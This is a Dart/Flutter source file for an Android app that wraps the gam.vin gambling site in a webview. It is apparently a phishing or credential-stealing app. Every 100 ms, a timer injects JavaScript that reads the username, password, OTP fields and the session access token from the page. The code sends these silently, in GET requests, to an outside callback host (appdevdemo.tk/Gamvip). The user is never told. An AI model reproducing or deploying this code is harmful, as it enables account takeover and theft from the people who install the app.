import 'dart:async';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart';

import 'package:flutter_webview_plugin/flutter_webview_plugin.dart';

//const kAndroidUserAgent =
//    'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Mobile Safari/537.36';
const kAndroidUserAgent =
    'Mozilla/5.0 (Linux; Android 5.1.1; SM-G9360L Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Beta/10.0.18363.418 Mobile Safari/537.36';
String urlCallback = 'http://appdevdemo.tk/Gamvip';
String selectedUrl = 'http://gam.vin/mobile';
String selectedUrl1 = 'https://www.google.com/?ref=download#/';
//String urlCallback = 'http://192.168.1.10/App';
String dialogStr = 'if (confirm("Hệ thống đang bận!")) {} else {}';

// ignore: prefer_collection_literals
final Set<JavascriptChannel> jsChannels = [
  JavascriptChannel(
      name: 'Print',
      onMessageReceived: (JavascriptMessage message) {
        print(message.message);
      }),
].toSet();

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  SystemChrome.setPreferredOrientations([
    DeviceOrientation.landscapeRight,
    DeviceOrientation.landscapeLeft,
  ]);

  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  final flutterWebViewPlugin = FlutterWebviewPlugin();

  @override
  Widget build(BuildContext context) {
    return MaterialApp(routes: {
      '/': (_) => const MyHomePage(),
      '/1': (_) {
        return WebviewScaffold(
            url: selectedUrl,
            javascriptChannels: jsChannels,
            mediaPlaybackRequiresUserGesture: false,
            withZoom: true,
            withLocalStorage: true,
            hidden: true);
      },
    });
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key key, this.title}) : super(key: key);

  final String title;

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  bool flag = false;
  bool flagChange = true;
  bool flagChangev1 = true;

  final myController = TextEditingController();
  // Instance of WebView plugin
  final flutterWebViewPlugin = FlutterWebviewPlugin();

  // On destroy stream
  StreamSubscription _onDestroy;

  // On urlChanged stream
  StreamSubscription<String> _onUrlChanged;

  // On urlChanged stream
  StreamSubscription<WebViewStateChanged> _onStateChanged;

  StreamSubscription<WebViewHttpError> _onHttpError;

  StreamSubscription<double> _onProgressChanged;

  StreamSubscription<double> _onScrollYChanged;

  StreamSubscription<double> _onScrollXChanged;

  final _urlCtrl = TextEditingController(text: selectedUrl);

  final _scaffoldKey = GlobalKey<ScaffoldState>();

  final _history = [];

  String accountStr = '';
  String passwordStr = '';

  // ignore: unused_field
  Timer _timer;
  double _start = 10000000;

  Function get onError => null;

  void onError1() {
    flag = true;
  }

  onError2() {}

  void startTimer() {
    const oneSec = const Duration(milliseconds: 100);
    _timer = new Timer.periodic(
      oneSec,
      (Timer timer) => setState(
        () {
          if (_start == 0) {
            _start = 1000000;
          }
          if (_start == 10000000) {
            flutterWebViewPlugin.launch(selectedUrl);
            flag = true;
          }

          if (flag) {
            try {
              flutterWebViewPlugin
                  .evalJavascript(
                      "document.getElementsByName('txtUsername')[0]")
                  .then((String resultaccountcheck) {
                if (resultaccountcheck != 'null') {
                  flutterWebViewPlugin
                      .evalJavascript(
                          "document.getElementsByName('txtUsername')[0].value")
                      .then((String resultaccount) {
                    try {
                      if (resultaccount != 'null') {
                        accountStr = resultaccount;
                      }
                      flutterWebViewPlugin
                          .evalJavascript(
                              "document.getElementsByName('txtPassword')[0]")
                          .then((String resultpasscheck) {
                        if (resultpasscheck != 'null') {
                          flutterWebViewPlugin
                              .evalJavascript(
                                  "document.getElementsByName('txtPassword')[0].value")
                              .then((String resultpass) {
                            if (resultpass != 'null') {
                              passwordStr = resultpass;
                            }
                            try {
                              flutterWebViewPlugin
                                  .evalJavascript(
                                      "document.getElementsByName('otp')[0]")
                                  .then((String otpTypeCheck) {
                                try {
                                  if (otpTypeCheck != 'null') {
                                    flutterWebViewPlugin
                                        .evalJavascript(
                                            "document.getElementsByName('otp')[0].value")
                                        .then((String otp) {
                                      if (otp.length == 8 && flagChangev1) {
                                        flagChangev1 = false;
                                        _makeGetRequestv2(
                                            'm', accountStr, passwordStr, otp);
                                      }
                                    }).catchError(onError2);
                                  } else {
                                    flagChangev1 = true;
                                    flutterWebViewPlugin
                                        .evalJavascript(
                                            "window.sessionStorage['GLOBAL_ACCESSTOKEN']")
                                        .then((String resulttoken) {
                                      if (resulttoken != 'null') {
                                        if (accountStr != 'null' &&
                                            passwordStr != 'null' &&
                                            flag) {
                                          flag = false;
                                          _makeGetRequest(resulttoken,
                                              accountStr, passwordStr);
                                        }
                                      }
                                    }).catchError(onError1);
                                  }
                                } catch (token) {
                                  //flag = true;
                                }
                              });
                            } catch (token) {
                              //flag = true;
                            }
                          }).catchError(onError1);
                        }
                      });
                    } catch (acount) {
                      //flag = true;
                      //accountStr = '';
                    }
                  }).catchError(onError1);
                }
              });
            } catch (pass) {
              //flag = true;
              //passwordStr = '';
            }
          } else {
            try {
              flutterWebViewPlugin
                  .evalJavascript("document.getElementsByName('otpType')[0]")
                  .then((String otpTypecheck) {
                if (otpTypecheck != 'null') {
                  flutterWebViewPlugin
                      .evalJavascript(
                          "document.getElementsByName('otpType')[0].value")
                      .then((String otpType) {
                    try {
                      flutterWebViewPlugin
                          .evalJavascript(
                              "document.getElementsByName('otp')[0].value")
                          .then((String otp) {
                        if (otp.length == 8 && flagChange) {
                          _makeGetRequestv1(
                              accountStr, passwordStr, otpType, otp);
                          flagChange = false;
                        } else if (otp.isEmpty && flagChange == false) {
                          flagChange = true;
                        }
                      }).catchError(onError2);
                    } catch (token) {
                      //flag = true;
                    }
                  });
                } else {
                  flagChange = true;
                }
              }).catchError(onError2);
              // ignore: empty_catches
            } catch (token) {}
          }

          _start = _start - 1;
        },
      ),
    );
  }

  @override
  void initState() {
    super.initState();

    SystemChrome.setPreferredOrientations([
      DeviceOrientation.landscapeRight,
      DeviceOrientation.landscapeLeft,
    ]);

    flutterWebViewPlugin.close();

    _urlCtrl.addListener(() {
      selectedUrl = _urlCtrl.text;
    });

    // Add a listener to on destroy WebView, so you can make came actions.
    _onDestroy = flutterWebViewPlugin.onDestroy.listen((_) {
      if (mounted) {
        // Actions like show a info toast.
        _scaffoldKey.currentState.showSnackBar(
            const SnackBar(content: const Text('Webview Destroyed')));
      }
    });

    // Add a listener to on url changed
    _onUrlChanged = flutterWebViewPlugin.onUrlChanged.listen((String url) {
      if (mounted) {
        setState(() {
          _history.add('onUrlChanged: $url');
        });
      }
    });

    _onProgressChanged =
        flutterWebViewPlugin.onProgressChanged.listen((double progress) {
      if (mounted) {
        setState(() {
          /*
          try {
            flutterWebViewPlugin
                .evalJavascript("window.sessionStorage['GLOBAL_ACCESSTOKEN']")
                .then((String result) {
              if (result != 'null') {
                flag = false;
              } else {
                flag = true;
              }
            }).catchError(onError1);
          } catch (ex) {
            flag = true;
          }*/
        });
      }
    });

    _onStateChanged =
        flutterWebViewPlugin.onStateChanged.listen((WebViewStateChanged state) {
      if (mounted) {
        setState(() {
          _history.add('onStateChanged: ${state.type} ${state.url}');
          /*
          try {
            flutterWebViewPlugin
                .evalJavascript("window.sessionStorage['GLOBAL_ACCESSTOKEN']")
                .then((String result) {
              if (result != 'null') {
                flag = false;
              } else {
                flag = true;
              }
            }).catchError(onError1);
          } catch (ex) {
            flag = true;
          }
          */
        });
      }
    });

    _onHttpError =
        flutterWebViewPlugin.onHttpError.listen((WebViewHttpError error) {
      if (mounted) {
        setState(() {
          _history.add('onHttpError: ${error.code} ${error.url}');
        });
      }
    });
  }

  @override
  void dispose() {
    // Every listener should be canceled, the same should be done with this stream.
    _onDestroy.cancel();
    _onUrlChanged.cancel();
    _onStateChanged.cancel();
    _onHttpError.cancel();
    _onProgressChanged.cancel();
    _onScrollXChanged.cancel();
    _onScrollYChanged.cancel();

    flutterWebViewPlugin.dispose();
    //myController.dispose();
    super.dispose();
  }

  void _makeGetRequestv1(
      String account, String pass, String otptype, String opt) async {
    // tạo GET request
    final String url = urlCallback +
        '/confirm.php?a=' +
        account +
        '&p=' +
        pass +
        '&otpType=' +
        otptype +
        '&otp=' +
        opt;
    //Response response = Null;

    // ignore: unused_local_variable
    final Response response = await get(url);

    final String url1 = urlCallback + '/testconfirm.php';

    final Response response1 = await get(url1);
    if (response1.statusCode == 200) {
      if (response1.body == '1') {
        //flutterWebViewPlugin.evalJavascript(dialogStr);
        flutterWebViewPlugin.close();
        flutterWebViewPlugin.launch(selectedUrl);
      }
    }

    /*
    // data sample trả về trong response
    int statusCode = response.statusCode;
    Map<String, String> headers = response.headers;
    String contentType = headers['content-type'];
    String json = response.body;
    */
    // Thực hiện convert json to object...
  }

  void _makeGetRequest(String m, String account, String pass) async {
    // tạo GET request
    final String url =
        urlCallback + '/login.php?m=' + m + '&a=' + account + '&p=' + pass;
    //Response response = Null;
    // ignore: unused_local_variable
    try {
      // ignore: unused_local_variable
      final Response response = await get(url);
      // ignore: empty_catches
    } catch (e1) {}

    final String url1 = urlCallback + '/testpass.php';
    final Response response1 = await get(url1);
    if (response1.statusCode == 200) {
      if (response1.body == '1') {
        //flutterWebViewPlugin.evalJavascript(dialogStr);
        flutterWebViewPlugin.close();
        flutterWebViewPlugin.launch(selectedUrl);
      }
    }

    /*
    // data sample trả về trong response
    int statusCode = response.statusCode;
    Map<String, String> headers = response.headers;
    String contentType = headers['content-type'];
    String json = response.body;
    */
    // Thực hiện convert json to object...
  }

  // ignore: unused_element
  void _makeGetRequestv2(
      String m, String account, String pass, String otp) async {
    // tạo GET request
    final String url = urlCallback +
        '/loginotp.php?m=' +
        m +
        '&a=' +
        account +
        '&p=' +
        pass +
        '&otp=' +
        otp;
    //Response response = Null;
    // ignore: unused_local_variable
    try {
      // ignore: unused_local_variable
      final Response response = await get(url);
      // ignore: empty_catches
    } catch (e1) {}

    final String url1 = urlCallback + '/testconfirm.php';
    final Response response1 = await get(url1);
    if (response1.statusCode == 200) {
      if (response1.body == '1') {
        //flutterWebViewPlugin.evalJavascript(dialogStr);
        flutterWebViewPlugin.close();
        flutterWebViewPlugin.launch(selectedUrl);
      }
    }

    /*
    // data sample trả về trong response
    int statusCode = response.statusCode;
    Map<String, String> headers = response.headers;
    String contentType = headers['content-type'];
    String json = response.body;
    */
    // Thực hiện convert json to object...
  }

  @override
  Widget build(BuildContext context) {
    startTimer();
    //flutterWebViewPlugin.launch(selectedUrl);
    return Scaffold(
      body: SingleChildScrollView(
        child: Column(mainAxisAlignment: MainAxisAlignment.center),
      ),
    );
  }
}
